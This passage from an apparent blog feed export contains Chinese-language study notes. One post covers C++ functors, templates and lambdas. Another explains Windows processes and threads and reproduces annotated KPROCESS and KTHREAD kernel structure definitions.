class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>explicit</code>：通过在单参数构造函数前添加 <code>explicit</code> 关键字，可以防止编译器在需要进行类型转换的情况下自动调用该构造函数。</li><li><code>operator</code>：仿函数的实现，使得对象可以像函数一样进行调用操作。</li></ul><p>抓函数中生成一个对象（该标准仅在c++11及以上支持），但是这样函数指针就没法用了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Greater&lt;<span class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br></pre></td></tr></table></figure><p>可以学习标准库中的操作将模板持续下去</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> fCompare&gt;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, fCompare ConditionFunc)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//持有的状态</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    Greater&lt;<span class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="lambda表达式"><a class="markdownIt-Anchor" href="#lambda表达式"></a> lambda表达式</h1><p>这个我再Qt上用的挺多的，他是匿名函数的实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="keyword">auto</span> greater20 = [](<span class="keyword">auto</span> &amp;val) -&gt; <span class="type">bool</span> &#123; <span class="keyword">return</span> val &gt; <span class="number">20</span>; &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;C++的函数进化小结&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="cpp" scheme="https://joe1sn.eu.org/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>【win内核原理与实现】II. 进程与线程</title>
    <link href="https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/"/>
    <id>https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/</id>
    <published>2023-06-14T01:41:52.000Z</published>
    <updated>2023-06-14T03:10:04.422Z</updated>
    
    <content type="html"><![CDATA[<p>Windows中进程与线程的设置</p><span id="more"></span><h1 id="关于进程与线程"><a class="markdownIt-Anchor" href="#关于进程与线程"></a> 关于进程与线程</h1><h2 id="操作系统复习"><a class="markdownIt-Anchor" href="#操作系统复习"></a> 操作系统“复习”</h2><p>​在学习操作系统的时候，有个重点就是进程与线程的区别。最开始进程和线程是没有分开的，由于多数操作系统分开了用户态和内核态，那么用户态就必须和内核态进行交互才能调用系统资源（通过IOCTL交互）。这样每一个进程在内核当中都有一个“进程描述符”的东西来描述这个进程，并根据调度算法完成进程的运行。这里就假设一个进程<code>test.exe</code>调用了<strong>0x40</strong>大小的内存空间，在<strong>只有</strong>进程的时候，进程描述符中就会标记这个内存被这个进程使用，同时指令和运行都在其中。<br />​这样有个问题就是，我需要两个这种“进程”来运行，且他们需要的恰好是同一块内存的相同数据，如果只有进程的话，就会存在两个0x40的内存，同时造成不必要的复制粘贴。随后就有了<strong>线程</strong>这个概念，比如面对上述情况，进程就只含有一个0x40大小的内存，对内存的访问就交给这个线程对应的进程。</p><h2 id="进程和程序"><a class="markdownIt-Anchor" href="#进程和程序"></a> 进程和程序</h2><p>​Windows的任务调度算法可以很好地适应多处理器和多任务的情形，在windows中的进程也遵守上述的准则。对于Windows内核需要做的事情是：<strong>维护一个全局的进程表</strong>，记录下当前有哪些进程正 在被执行；<strong>把时间分成适当的片段</strong>，在现代处理器结构中，这可以通过设置时钟中断来完成，因而每次时钟中断到来时系统就会获得控制权；<strong>在进程间实施切换</strong>，即保留上一个进 程的环境信息，恢复下一个进程的执行环境。关于Windows的调度算法可以简单理解为时间轮。</p><p>​如果程序是一个完全的模块，那么他的内存就是我们熟悉的经典内存结构。</p><img src="https://img.joe1sn.top/uploads/big/58d86fa1e2cc5aee1ae0b8da258a64d3.png" alt="image-20230614104209374" style="zoom:50%;" /><p>​但是往往一个最简单的helloworld也会调用CRunTime的代码，所以有进程就能使用 <strong>共享内存</strong> ，比如在静态数据区有着一份复制。</p><h2 id="线程"><a class="markdownIt-Anchor" href="#线程"></a> 线程</h2><p>​线程不仅仅是一个控制流，它还有更多的内容。线程的调用栈（call stack）记录了它 作为控制流的状态信息，包括每一层函数调用和返回的指令地址。线程一定隶属于某个进 程，其控制流可以访问这个进程中的资源，包括所有的内存数据以及系统分配给此进程的 其他资源。一个进程可以有多个线程，由于这些线程隶属于同一个进程，所以它们之间相 互通信要方便得多，毕竟几乎所有的资源（并非全部）对于它们来说都是共享的。</p><h1 id="windows-中进程和线程的数据结构"><a class="markdownIt-Anchor" href="#windows-中进程和线程的数据结构"></a> Windows 中进程和线程的数据结构</h1><h2 id="内核层的进程和线程对象"><a class="markdownIt-Anchor" href="#内核层的进程和线程对象"></a> 内核层的进程和线程对象</h2><p>在内核当中的描述为<code>KPROCESS</code>和<code>KTHREAD</code>。</p><p>在WRK中的定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;<span class="comment">//表明是分发器对象，可用于等待。进程退出时，此对象为有信号状态</span></span><br><span class="line">     LIST_ENTRY ProfileListHead;<span class="comment">//进程参与性能分析时，作为节点加入全局性能分析进程链表。</span></span><br><span class="line">     ULONG DirectoryTableBase;<span class="comment">// 两个成员的数组，第一个指向页目录表地址，第二个指向超空间的页目录表地址</span></span><br><span class="line">     ULONG Unused0;</span><br><span class="line">     KGDTENTRY LdtDescriptor;<span class="comment">//LDT的描述符</span></span><br><span class="line">     KIDTENTRY Int21Descriptor;<span class="comment">//为了兼容DOS，通过int 21h调用系统功能</span></span><br><span class="line">     WORD IopmOffset;<span class="comment">//指定IOPM（IO权限表，IO Privilege Map）位置。控制进程的用户模式IO访问权限</span></span><br><span class="line">     UCHAR Iopl;<span class="comment">//IO优先级（IO Privilege Level）</span></span><br><span class="line">     UCHAR Unused;</span><br><span class="line">     ULONG ActiveProcessors;<span class="comment">//记录进程正在哪些处理器上运行</span></span><br><span class="line">     ULONG KernelTime;<span class="comment">//在内核模式运行所花时间</span></span><br><span class="line">     ULONG UserTime;<span class="comment">//在用户模式运行所花时间</span></span><br><span class="line">     LIST_ENTRY ReadyListHead;<span class="comment">//保存进程中处于就绪状态但未被加入全局就绪链表的线程</span></span><br><span class="line">     SINGLE_LIST_ENTRY SwapListEntry;<span class="comment">//进程要被换出时，通过此域加入到KiProcessOutSwapListHead为头的单链表</span></span><br><span class="line">     PVOID VdmTrapcHandler;<span class="comment">//VDM环境下运行16位程序时，处理Ctrl+C中断的函数</span></span><br><span class="line">     LIST_ENTRY ThreadListHead;<span class="comment">//指向一个链表头，链表中包含该进程的所有线程</span></span><br><span class="line">     ULONG ProcessLock;<span class="comment">//一个自旋锁对象。保证对进程数据结构中成员的互斥访问</span></span><br><span class="line">     ULONG Affinity;<span class="comment">//指定该进程的线程可以在哪些处理器上运行</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;<span class="comment">//</span></span><br><span class="line">          ULONG DisableQuantum: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">29</span>;</span><br><span class="line">          LONG ProcessFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR BasePriority;<span class="comment">//该进程的线程的基本优先级</span></span><br><span class="line">     CHAR QuantumReset;<span class="comment">//进程中线程的基本时限重置值</span></span><br><span class="line">     UCHAR State;<span class="comment">//说明进程是否在内存中</span></span><br><span class="line">     UCHAR ThreadSeed;<span class="comment">//该进程的下一个创建线程的理想处理器</span></span><br><span class="line">     UCHAR PowerState;<span class="comment">//电源状态</span></span><br><span class="line">     UCHAR IdealNode;<span class="comment">//进程优先选择的处理器节点</span></span><br><span class="line">     UCHAR Visited;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KEXECUTE_OPTIONS Flags;</span><br><span class="line">          UCHAR ExecuteOptions;<span class="comment">//NX执行选项</span></span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG StackCount;<span class="comment">//当前进程中有多少个线程的栈位于内存中</span></span><br><span class="line">     LIST_ENTRY ProcessListEntry;<span class="comment">//当前系统中所有具有活动线程的进程通过这个域串成一个链表</span></span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">&#125; KPROCESS, *PKPROCESS;</span><br></pre></td></tr></table></figure><p>那么在线程当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;</span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">     ULONG HighCycleTime;</span><br><span class="line">     UINT64 QuantumTarget;</span><br><span class="line">     PVOID InitialStack;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID KernelStack;</span><br><span class="line">     ULONG ThreadLock;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE ApcState;</span><br><span class="line">          UCHAR ApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR Priority;</span><br><span class="line">     WORD NextProcessor;</span><br><span class="line">     WORD DeferredProcessor;</span><br><span class="line">     ULONG ApcQueueLock;</span><br><span class="line">     ULONG ContextSwitches;</span><br><span class="line">     UCHAR State;</span><br><span class="line">     UCHAR NpxState;</span><br><span class="line">     UCHAR WaitIrql;</span><br><span class="line">     CHAR WaitMode;</span><br><span class="line">     LONG WaitStatus;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PKWAIT_BLOCK WaitBlockList;</span><br><span class="line">          PKGATE GateObject;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG KernelStackResident: <span class="number">1</span>;</span><br><span class="line">          ULONG ReadyTransition: <span class="number">1</span>;</span><br><span class="line">          ULONG ProcessReadyQueue: <span class="number">1</span>;</span><br><span class="line">          ULONG WaitNext: <span class="number">1</span>;</span><br><span class="line">          ULONG SystemAffinityActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Alertable: <span class="number">1</span>;</span><br><span class="line">          ULONG GdiFlushActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Reserved: <span class="number">25</span>;</span><br><span class="line">          LONG MiscFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR WaitReason;</span><br><span class="line">     UCHAR SwapBusy;</span><br><span class="line">     UCHAR Alerted[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY WaitListEntry;</span><br><span class="line">          SINGLE_LIST_ENTRY SwapListEntry;</span><br><span class="line">     &#125;;</span><br><span class="line">     PKQUEUE Queue;</span><br><span class="line">     ULONG WaitTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               SHORT KernelApcDisable;</span><br><span class="line">               SHORT SpecialApcDisable;</span><br><span class="line">          &#125;;</span><br><span class="line">          ULONG CombinedApcDisable;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID Teb;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KTIMER Timer;</span><br><span class="line">          UCHAR TimerFill[<span class="number">40</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc1Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc2Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG CycleChargePending: <span class="number">1</span>;</span><br><span class="line">          ULONG CalloutActive: <span class="number">1</span>;</span><br><span class="line">          ULONG ApcQueueable: <span class="number">1</span>;</span><br><span class="line">          ULONG EnableStackSwap: <span class="number">1</span>;</span><br><span class="line">          ULONG GuiThread: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">23</span>;</span><br><span class="line">          LONG ThreadFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KWAIT_BLOCK WaitBlock[<span class="number">4</span>];</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill0[<span class="number">23</span>];</span><br><span class="line">               UCHAR IdealProcessor;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill1[<span class="number">47</span>];</span><br><span class="line">               CHAR PreviousMode;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill2[<span class="number">71</span>];</span><br><span class="line">               UCHAR ResourceIndex;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR WaitBlockFill3[<span class="number">95</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR LargeStack;</span><br><span class="line">     LIST_ENTRY QueueListEntry;</span><br><span class="line">     PKTRAP_FRAME TrapFrame;</span><br><span class="line">     PVOID FirstArgument;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PVOID CallbackStack;</span><br><span class="line">          ULONG CallbackDepth;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID ServiceTable;</span><br><span class="line">     UCHAR ApcStateIndex;</span><br><span class="line">     CHAR BasePriority;</span><br><span class="line">     CHAR PriorityDecrement;</span><br><span class="line">     UCHAR Preempted;</span><br><span class="line">     UCHAR AdjustReason;</span><br><span class="line">     CHAR AdjustIncrement;</span><br><span class="line">     UCHAR Spare01;</span><br><span class="line">     CHAR Saturation;</span><br><span class="line">     ULONG SystemCallNumber;</span><br><span class="line">     ULONG Spare02;</span><br><span class="line">     ULONG UserAffinity;</span><br><span class="line">     PKPROCESS Process;</span><br><span class="line">     ULONG Affinity;</span><br><span class="line">     PKAPC_STATE ApcStatePointer[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE SavedApcState;</span><br><span class="line">          UCHAR SavedApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR FreezeCount;</span><br><span class="line">     CHAR SuspendCount;</span><br><span class="line">     UCHAR UserIdealProcessor;</span><br><span class="line">     UCHAR Spare03;</span><br><span class="line">     UCHAR Iopl;</span><br><span class="line">     PVOID Win32Thread;</span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC SuspendApc;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill0[<span class="number">1</span>];</span><br><span class="line">               CHAR Spare04;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill1[<span class="number">3</span>];</span><br><span class="line">               UCHAR QuantumReset;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill2[<span class="number">4</span>];</span><br><span class="line">               ULONG KernelTime;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill3[<span class="number">36</span>];</span><br><span class="line">               PKPRCB WaitPrcb;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill4[<span class="number">40</span>];</span><br><span class="line">               PVOID LegoData;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR SuspendApcFill5[<span class="number">47</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR PowerState;</span><br><span class="line">     ULONG UserTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KSEMAPHORE SuspendSemaphore;</span><br><span class="line">          UCHAR SuspendSemaphorefill[<span class="number">20</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG SListFaultCount;</span><br><span class="line">     LIST_ENTRY ThreadListEntry;</span><br><span class="line">     LIST_ENTRY MutantListHead;</span><br><span class="line">     PVOID SListFaultAddress;</span><br><span class="line">     PVOID MdlForLockedTeb;</span><br><span class="line">&#125; KTHREAD, 